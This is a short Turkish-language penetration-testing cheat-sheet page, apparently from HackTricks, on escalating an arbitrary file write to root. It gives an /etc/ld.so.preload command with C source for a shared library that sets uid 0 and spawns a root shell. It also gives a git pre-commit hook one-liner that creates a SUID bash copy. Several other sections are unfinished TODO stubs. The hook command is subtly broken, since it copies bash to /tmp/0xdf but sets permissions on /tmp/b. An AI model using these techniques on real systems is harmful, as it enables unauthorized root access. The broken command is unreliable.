# Root'a Rastgele Dosya Yazma

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Bu dosya **`LD_PRELOAD`** ortam değişkeni gibi davranır ama aynı zamanda **SUID ikili dosyalarında** da çalışır.\
Eğer bunu oluşturabiliyor veya değiştirebiliyorsanız, her çalıştırılan ikili dosya ile yüklenecek bir **kütüphane yolu ekleyebilirsiniz**.

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) çeşitli **olaylar** sırasında bir git deposunda **çalıştırılan** **scriptler**dir, örneğin bir commit oluşturulduğunda, bir merge... Yani eğer bir **ayrılmış script veya kullanıcı** bu işlemleri sıkça gerçekleştiriyorsa ve **`.git` klasörüne yazma** imkanı varsa, bu **privesc** için kullanılabilir.

Örneğin, bir git deposunda **`.git/hooks`** içinde her yeni commit oluşturulduğunda her zaman çalıştırılacak bir **script** **üretmek** mümkündür:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time dosyaları

TODO

### Service & Socket dosyaları

TODO

### binfmt_misc

`/proc/sys/fs/binfmt_misc` konumundaki dosya, hangi ikili dosyanın hangi tür dosyaları çalıştırması gerektiğini gösterir. TODO: yaygın bir dosya türü açıldığında bir rev shell çalıştırmak için bunu kötüye kullanma gereksinimlerini kontrol et. 

{{#include ../../banners/hacktricks-training.md}}
